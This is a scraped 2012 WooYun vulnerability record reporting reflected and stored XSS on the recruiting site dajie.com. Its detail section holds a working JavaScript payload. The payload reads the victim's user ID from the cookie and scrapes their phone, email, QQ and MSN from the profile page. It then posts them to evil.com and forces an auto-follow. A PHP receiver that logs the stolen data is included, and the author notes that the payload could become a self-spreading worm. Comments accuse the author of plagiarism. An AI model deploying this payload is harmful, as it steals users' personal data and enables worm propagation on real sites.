{"id": 16830, "wybug_id": "wooyun-2012-011944", "wybug_title": "大街网反弹and存储型XSS漏洞及测试Payload", "wybug_corp": "大杰世纪科技发展（北京）有限公司", "wybug_author": "小屁孩", "wybug_date": "2012-09-09 15:01", "wybug_open_date": "2012-10-24 15:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-24：\t细节向公众公开  简要描述： 前几个月去大街网上找实习，目前算是企业校招最权威的一个网站了，简单测试了下，储存型和反弹型XSS应有尽有。 详细说明：  http://www.dajie.com/http://www.dajie.com/card/exchange/index?keyWords=1234′);alert(document.cookie);//\n\n\n\n\n\n\n\n完全没有过滤。另外个人简历和个人名片处也有存储型XSS。\n\n然后访问个人主页：\n\n通过这些XSS点，收集一些未公开用户的个人信息简历信息就比较容易了。自己写了一个简单的XSS Payload，可以收集用户联系信息发送到远程，自动关注本人，通过Cookie避免二次污染。几个功能都在同域，加个自动发短消息的功能就变成了一个简单的蠕虫了，只发了Payload部分，使用了较新的DOM方法getElementsByClassName，初涉XSS，大牛飘过，欢迎吐槽。\n\nXSS Payload:var c_name = \"uchome_loginuser\" //cookie中存放用户ID的字段var c_userid = \"\" //用户IDvar cus_url = \"http://www.dajie.com/profile/mine\" //个人信息界面var tel = \"\" //记录电话var email = \"\" //记录邮件var qq = \"\" //记录QQvar msn = \"\" //记录MSN</code>function getCookieValue(c_name){if(document.cookie.length&gt;0) //返回Cookie指定字段{c_start = document.cookie.indexOf(c_name + \"=\")if(c_start != -1){c_start = c_start + c_name.length+1;c_end = document.cookie.indexOf(\";\",c_start)if(c_end == -1) c_end = document.cookie.lengthc_userid = unescape(document.cookie.substring(c_start,c_end))return c_userid}return \"\"}}function setCookieValue(c_name,value) //添加Cookie指定值{document.cookie = c_name+\"=\"+escape(value)}var ajaxGet = nullfunction getUrl(url_addr){ //通过Ajax请求GET页面内容(同域)if(window.XMLHttpRequest){ajaxGet = new XMLHttpRequest();}else if(window.ActiveXObject){ajaxGet = new ActiveXObject(\"Microsoft.XMLHTTP\");}else{return \"\"}ajaxGet.open(\"GET\",url_addr,true)ajaxGet.setRequestHeader(\"Content-Type\",\"text/xml\")ajaxGet.send(null);}var ajaxPost = nullfunction postUrl(post_url,cusKey,cusValue) //通过Ajax请求POST到远程{var postStr = cusKey+\"=\"+cusValueif(window.XMLHttpRequest){ajaxPost = new XMLHttpRequest();}else if(window.ActiveXObject){ajaxPost = new ActiveXObject(\"Microsoft.XMLHTTP\");}else{return \"\"}ajaxPost.open(\"POST\",post_url,true)//ajax.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\")ajaxPost.send(postStr)}function getPersonalInfo(responContent) //提取用户个人信息{var cusNode = document.createElement(\"div\")cusNode.innerHTML = responContentdocument.body.appendChild(cusNode)var preInfo = document.getElementsByClassName(\"tl-contact-item tel\")var realInfo = preInfo[0].getElementsByTagName(\"i\")tel = realInfo[0].getAttribute(\"title\")var preInfo = document.getElementsByClassName(\"tl-contact-item qq\")var realInfo = preInfo[0].getElementsByTagName(\"i\")qq = realInfo[0].getAttribute(\"title\")var preInfo = document.getElementsByClassName(\"tl-contact-item msn\")var realInfo = preInfo[0].getElementsByTagName(\"i\")msn = realInfo[0].getAttribute(\"title\")var preInfo = document.getElementsByClassName(\"tl-contact-item email\")var realInfo = preInfo[0].getElementsByTagName(\"i\")email = realInfo[0].getAttribute(\"title\")}c_userid = getCookieValue(c_name) //从Cookie中获取用户IDvar icard_url = \"http://www.dajie.com/profile/\"+c_userid+\"/icard\" //构造个人名片Urlfunction FollowMe() //自动关注指定用户{var img = document.createElement(\"img\")img.src=\"http://www.dajie.com/card/exchange/api/invite?cardUid=xxxxxx&amp;ajax=1\"document.body.appendChild(img)}if(document.cookie.indexOf(\"xssed\") == -1)//判断是否已经污染{var content = \"\"getUrl(cus_url) //获取要获取页面的内容ajaxGet.onreadystatechange = function(){if(ajaxGet.readyState == 4 &amp;&amp; ajaxGet.status == 200){content = ajaxGet.responseTextgetPersonalInfo(content)var cusForm = document.createElement(\"div\");document.body.appendChild(cusForm)cusForm.innerHTML = '<form id=\"xssform\" action=\"http://www.evil.com/xsstest.php\" method=\"post\" name=\"mbform\">'+'<input type=\"text\" name=\"tel\" value=\"+escape(tel)+\" />'+'<input type=\"text\" name=\"email\" value=\"+escape(email)+\" />'+'<input type=\"text\" name=\"qq\" value=\"+escape(qq)+\" />'+'<input type=\"text\" name=\"msn\" value=\"+escape(msn)+\" />'+'</form>'document.getElementById(\"xssform\").submit(); } }FollowMe() }setCookieValue(\"xssed\",true) //设置Cookie避免多次污染远程接收信息的xsstest.php<?php$ip = $_SERVER['REMOTE_ADDR'];$referer = $_SERVER['HTTP_REFERER'];$agent = $_SERVER['HTTP_USER_AGENT'];$tel = $_POST[tel];$qq = $_POST[qq];$msn = $_POST[msn];$email = $_POST[email];$time = date(\"Y-m-d G:i:s A\");$file = fopen($ip.'.txt' , 'a');fwrite($file,\"Tel:\".$tel.\"\\nQQ:\".$qq.\"\\nMSN:\".$msn.\"\\nEmail:\".$email);fclose($file);header(\"Location: \".$referer);//?>   漏洞证明：  \n\n   修复方案：  大牛多   版权声明：转载请注明来源 小屁孩@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-09-09 18:30 厂商回复： 感谢您对大街网的支持，我们会尽快处理修复漏洞，谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-09 17:32 |    \t\tPnig0s \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:2        | The quiter you are,the more you're able ...)\t\t \n  这好像是我写的文章吧亲，有意思么？http://www.freebuf.com/vuls/1506.html    \n     2012-09-10 11:32 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  坐等楼主解释。。    \n     2012-10-03 19:05 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  图片上的署名都没改....    \n     2012-10-10 09:19 |    \t\t妹子快跑 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 妹子快跑,哥哥我是好人！嘿嘿)\t\t \n  啊哈。被抓个现行.......................    \n     2012-10-24 15:07 |    \t\t剑心 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:9        | xsser)\t\t \n  @xsser    \n     2012-10-24 16:13 |    \t\t小禾吉 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 宇宙的目的很可能和人类没有关系，宇宙很可...)\t\t \n  这位小朋友很喜欢转载别人的东西啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}